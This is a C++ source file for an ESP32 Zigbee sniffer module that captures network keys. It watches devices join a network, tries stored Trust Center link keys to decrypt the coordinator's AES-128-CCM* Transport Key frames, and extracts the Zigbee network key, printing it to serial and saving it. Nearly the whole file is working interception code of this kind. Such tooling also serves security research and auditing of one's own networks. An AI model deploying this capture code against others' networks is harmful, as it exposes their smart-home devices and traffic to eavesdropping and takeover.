/*
 * ZbKeyCapture.cpp - Zigbee Network Key interception
 *
 * AES-128-CCM* decryption using mbedtls (included in ESP32 Arduino core)
 *
 * CCM* nonce construction (13 bytes, per Zigbee spec 4.5.1):
 *   Source EUI64 (8 bytes, little-endian from AUX header)
 *   Frame counter (4 bytes, little-endian from AUX header)
 *   Security control byte (1 byte, from AUX header)
 *
 * Additional auth data (AAD) = everything before the encrypted payload:
 *   MAC header + NWK header + NWK AUX security header
 *   (excludes the MIC at the end)
 */

#include "ZbKeyCapture.h"

// mbedtls CCM - included in ESP32 Arduino core
#include "mbedtls/ccm.h"

// -- APS layer constants -------------------------------------------------------
#define APS_CMD_TRANSPORT_KEY   0x05
#define APS_KEY_TYPE_NWK        0x01
#define APS_KEY_TYPE_TCLK       0x04

// AUX security header security level - MIC-32 with encryption
#define ZB_SEC_LEVEL_ENC_MIC32  0x05
#define ZB_MIC_LEN              4    // MIC-32 = 4 bytes

ZbKeyCapture::ZbKeyCapture(IEEE802154Sniffer &sniffer)
    : _sniffer(sniffer), onKeyCapture(nullptr)
{
    memset(_joins, 0, sizeof(_joins));
}

// -- Public --------------------------------------------------------------------

bool ZbKeyCapture::processFrame(const FrameInfo &info,
                                 const uint8_t *rawFrame, uint8_t rawLen,
                                 uint8_t macPayloadOffset) {

        // Temporary debug — remove after confirming calls
    if (info.frameType == FC_FRAME_TYPE_DATA && info.zbNwkSecurityEnabled)
        Serial.printf("[KC] encrypted data from 0x%04X→0x%04X nwkSrc=0x%04X\n",
                          info.macSrc, info.macDst, info.route.nwkSrc);

 // Debug
     Serial.printf("[KC] frame type=%u proto=%u zbSec=%d src=0x%04X dst=0x%04X\n",
                   info.frameType, (uint8_t)info.protocol, info.zbNwkSecurityEnabled,
                               info.route.nwkSrc, info.route.nwkDst);


    if (info.frameType == FC_FRAME_TYPE_MAC_CMD) {
        if (rawLen > macPayloadOffset && rawFrame[macPayloadOffset] == 0x02) {
            _handleAssocResponse(info);
        }
        return false;
    }

    if (info.protocol == FrameProtocol::ZIGBEE &&
        info.frameType == FC_FRAME_TYPE_DATA &&
        info.zbNwkSecurityEnabled) {
        if (macPayloadOffset >= rawLen) return false;
        // Pass NWK payload slice — not the full raw frame
        return _handleTransportKey(info,
                                   &rawFrame[macPayloadOffset],
                                   rawLen - macPayloadOffset);
    }
    return false;
}

void ZbKeyCapture::expireJoins(uint32_t timeout_ms) {
    uint32_t now = millis();
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (_joins[i].active &&
            (now - _joins[i].assocTime_ms) > timeout_ms) {
            Serial.printf("[KeyCapture] Join timeout for 0x%04X\n",
                          _joins[i].shortAddr);
            _joins[i].active = false;
        }
    }
}

// -- Join state management -----------------------------------------------------

JoinState *ZbKeyCapture::_findJoin(uint16_t addr) {
    for (int i = 0; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].active && _joins[i].shortAddr == addr) return &_joins[i];
    return nullptr;
}

JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
    // Reuse existing or find free slot
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (!_joins[i].active) {
            _joins[i].active       = true;
            _joins[i].shortAddr    = addr;
            _joins[i].extAddr      = 0;
            _joins[i].assocTime_ms = millis();
            return &_joins[i];
        }
    }
    // All full - evict oldest
    JoinState *oldest = &_joins[0];
    for (int i = 1; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].assocTime_ms < oldest->assocTime_ms)
            oldest = &_joins[i];
    oldest->active       = true;
    oldest->shortAddr    = addr;
    oldest->extAddr      = 0;
    oldest->assocTime_ms = millis();
    return oldest;
}

void ZbKeyCapture::_freeJoin(JoinState *j) {
    if (j) j->active = false;
}

// -- Association Response handler ----------------------------------------------

void ZbKeyCapture::_handleAssocResponse(const FrameInfo &info) {
    // Association Response is from coordinator (0x0000) to joining device
    // The joining device may be addressed by short OR extended address at this stage
    if (info.macSrc != 0x0000) return;

    JoinState *j;
    if (info.dstAddrMode == ADDR_MODE_EXTENDED) {
        // Device addressed by EUI64 — store EUI64, short addr unknown yet
        // Use lower 16 bits of EUI64 as temporary key (will match on NWK dst later)
        uint16_t tempKey = (uint16_t)(info.dstExtended & 0xFFFF);
        j = _allocJoin(tempKey);
        j->extAddr = info.dstExtended;
        j->shortAddr = 0xFFFE;  // mark as unknown
        Serial.printf("[KeyCapture] Join (ext addr): EUI64=%016llX\n",
                      info.dstExtended);
    } else {
        // Device addressed by short address
        j = _allocJoin(info.macDst);
        j->extAddr = info.dstExtended;
        Serial.printf("[KeyCapture] Join detected: 0x%04X (EUI64: %016llX)\n",
                      info.macDst, info.dstExtended);
    }
}

// -- Transport Key handler -----------------------------------------------------

bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
                                        const uint8_t *nwkPayload,
                                        uint8_t nwkLen) {
    // Only from coordinator to a recently-joined device
    if (info.route.nwkSrc != 0x0000) return false;
    if (is_bcast(info.route.nwkDst))  return false;

    // Check if destination recently joined — but try anyway even if missed
    JoinState *j = _findJoin(info.route.nwkDst);
    if (!j) {
        // Try EUI64-based match for extended-addressed joins
        for (int i = 0; i < MAX_PENDING_JOINS; i++) {
            if (_joins[i].active && _joins[i].shortAddr == 0xFFFE) {
                // Placeholder join from extended-addr association — accept
                j = &_joins[i];
                j->shortAddr = info.route.nwkDst;  // now we know the short addr
                break;
            }
        }
    }
    // Log regardless — we attempt decryption even without confirmed join state
    Serial.printf("[KeyCapture] Coord→0x%04X encrypted — attempting decrypt, nwkLen=%u\n",
                  info.route.nwkDst, nwkLen);

    // Hex dump first 32 bytes for debugging
    Serial.print("[KeyCapture] NWK: ");
    for (uint8_t i = 0; i < min((uint8_t)32, nwkLen); i++)
        Serial.printf("%02X ", nwkPayload[i]);
    Serial.println();

    // Find APS payload offset (after NWK header + AUX security header)
    uint8_t apsOffset = 0;
    if (!_skipNwkHeader(nwkPayload, nwkLen, apsOffset)) {
        Serial.println("[KeyCapture] Could not parse NWK header");
        return false;
    }

    Serial.printf("[KeyCapture] nwkLen=%u apsOffset=%u\n", nwkLen, apsOffset);

    // Try each TCLK we have
    for (int ki = 0; ki < _sniffer.keys.size(); ki++) {
        ZbKey *k = _sniffer.keys.get(ki);
        if (k->type != ZbKeyType::TRUST_CENTER_LINK) continue;

        uint8_t plaintext[64] = {};
        uint8_t plaintextLen  = 0;

        if (!_decryptNwkPayload(nwkPayload, nwkLen, apsOffset,
                                 k->key, plaintext, plaintextLen)) {
            continue;  // wrong key or bad MIC - try next
        }

        // Decryption succeeded - parse APS Transport Key
        uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
        uint8_t keySeqNum = 0;

        if (!_parseTransportKey(plaintext, plaintextLen, networkKey, keySeqNum)) {
            Serial.println("[KeyCapture] APS parse failed after successful decrypt");
            continue;
        }

        // Got the network key!
        Serial.printf("[KeyCapture] *** Network key captured! seq=%u ***\n", keySeqNum);
        Serial.print("[KeyCapture] Key: ");
        for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
            Serial.printf("%02X%s", networkKey[i], i < ZIGBEE_KEY_LEN-1 ? ":" : "\n");

        char label[16];
        snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
        _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);

        if (j) _freeJoin(j);

        if (onKeyCapture) {
            ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
            if (captured) onKeyCapture(*captured);
        }
        return true;
    }

    Serial.printf("[KeyCapture] Could not decrypt Transport Key for 0x%04X "
                  "(no matching TCLK or not Transport Key)\n",
                  info.route.nwkDst);
    return false;
}

// -- Skip NWK header to find AUX security header offset -----------------------
bool ZbKeyCapture::_skipNwkHeader(const uint8_t *p, uint8_t len,
                                   uint8_t &apsOffset) {
    if (len < 8) return false;

    uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    uint8_t off = 8;  // fixed NWK header: FC(2) + dst(2) + src(2) + radius(1) + seq(1)

    // Optional multicast control
    if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }

    // Optional extended destination
    if (nwkFc & ZB_NWK_FC_EXT_DST) { if (off + 8 > len) return false; off += 8; }

    // Optional extended source
    if (nwkFc & ZB_NWK_FC_EXT_SRC) { if (off + 8 > len) return false; off += 8; }

    // Source route subframe
    if (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) {
        if (off + 2 > len) return false;
        uint8_t relayCount = p[off];
        off += 2 + relayCount * 2;
        if (off > len) return false;
    }

    // NWK security bit must be set
    if (!((nwkFc >> 1) & 0x01)) return false;

    // AUX security header starts here
    apsOffset = off;
    return true;
}

// -- Decrypt NWK payload using AES-128-CCM* -----------------------------------
bool ZbKeyCapture::_decryptNwkPayload(const uint8_t *frame, uint8_t frameLen,
                                       uint8_t apsOffset,
                                       const uint8_t *key,
                                       uint8_t *plaintextOut,
                                       uint8_t &plaintextLen) {
    // AUX security header layout:
    //   sec_ctrl (1) | frame_counter (4) | [ext_src (8)] | key_seq (1)
    const uint8_t *aux = &frame[apsOffset];
    uint8_t remaining = frameLen - apsOffset;
    if (remaining < 6) return false;

    uint8_t  secCtrl    = aux[0];
    uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
                            ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
    bool     hasExtSrc  = (secCtrl >> 6) & 0x01;
    uint8_t  secLevel   = secCtrl & 0x07;

    uint8_t auxOff = 5;
    uint8_t srcEui64[8] = {};
    if (hasExtSrc) {
        if (auxOff + 8 > remaining) return false;
        memcpy(srcEui64, &aux[auxOff], 8);
        auxOff += 8;
    } else {
        // No extended src in AUX - may need to get it from NWK extended src field
        // For now leave as zeros (will cause MIC mismatch if required)
    }

    if (auxOff + 1 > remaining) return false;
    // uint8_t keySeqNum = aux[auxOff];
    auxOff++;

    // Encrypted payload starts after AUX header, ends before MIC
    uint8_t encOffset = apsOffset + auxOff;
    if (encOffset + ZB_MIC_LEN >= frameLen) return false;
    uint8_t encLen    = frameLen - encOffset - ZB_MIC_LEN;
    const uint8_t *ciphertext = &frame[encOffset];
    const uint8_t *mic        = &frame[frameLen - ZB_MIC_LEN];

    // Build CCM* nonce (13 bytes):
    //   src EUI64 (8, LE) | frame counter (4, LE) | sec ctrl (1)
    uint8_t nonce[13];
    memcpy(nonce,     srcEui64, 8);
    memcpy(nonce + 8, &aux[1],  4);  // frame counter little-endian
    nonce[12] = secCtrl;

    // AAD = everything from start of frame to start of ciphertext
    const uint8_t *aad    = frame;
    uint8_t        aadLen = encOffset;

    if (encLen > 63) return false;

    bool ok = _ccmDecrypt(key, nonce, aad, aadLen,
                           ciphertext, encLen,
                           plaintextOut, mic, ZB_MIC_LEN);
    if (ok) plaintextLen = encLen;
    return ok;
}

// -- AES-128-CCM* decryption via mbedtls --------------------------------------
bool ZbKeyCapture::_ccmDecrypt(const uint8_t *key,
                                const uint8_t *nonce,
                                const uint8_t *aad,   uint8_t aadLen,
                                const uint8_t *ct,    uint8_t ctLen,
                                uint8_t       *pt,
                                const uint8_t *mic,   uint8_t micLen) {
    mbedtls_ccm_context ctx;
    mbedtls_ccm_init(&ctx);

    int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 128);
    if (ret != 0) {
        mbedtls_ccm_free(&ctx);
        return false;
    }

    // mbedtls ccm_auth_decrypt: ciphertext includes appended tag in some versions
    // Use ccm_star_auth_decrypt for CCM* (no length encoding in flags)
    ret = mbedtls_ccm_star_auth_decrypt(&ctx,
                                         ctLen,
                                         nonce, 13,
                                         aad, aadLen,
                                         ct,
                                         pt,
                                         mic, micLen);

    mbedtls_ccm_free(&ctx);
    return (ret == 0);
}

// -- Parse APS Transport Key payload ------------------------------------------
bool ZbKeyCapture::_parseTransportKey(const uint8_t *aps, uint8_t apsLen,
                                       uint8_t *networkKeyOut,
                                       uint8_t &seqNumOut) {
    // APS frame control (1) + cluster ID (2, for data) OR
    // APS FC (1) + cmd ID (1) for command frames
    // For APS command frames: FC bits[1:0] = 01 (command)
    if (apsLen < 2) return false;

    uint8_t apsFc  = aps[0];
    uint8_t apsFrameType = apsFc & 0x03;

    // We expect APS command frame (type = 0x01)
    if (apsFrameType != 0x01) return false;

    uint8_t cmdId = aps[1];
    if (cmdId != APS_CMD_TRANSPORT_KEY) return false;

    // Transport Key payload: key_type(1) + key(16) + seq(1) + dst_eui64(8) + src_eui64(8)
    if (apsLen < 2 + 1 + 16 + 1 + 8 + 8) return false;

    uint8_t keyType = aps[2];
    if (keyType != APS_KEY_TYPE_NWK) {
        Serial.printf("[KeyCapture] Transport Key type=0x%02X (not NWK)\n", keyType);
        return false;
    }

    memcpy(networkKeyOut, &aps[3], ZIGBEE_KEY_LEN);
    seqNumOut = aps[3 + ZIGBEE_KEY_LEN];
    return true;
}
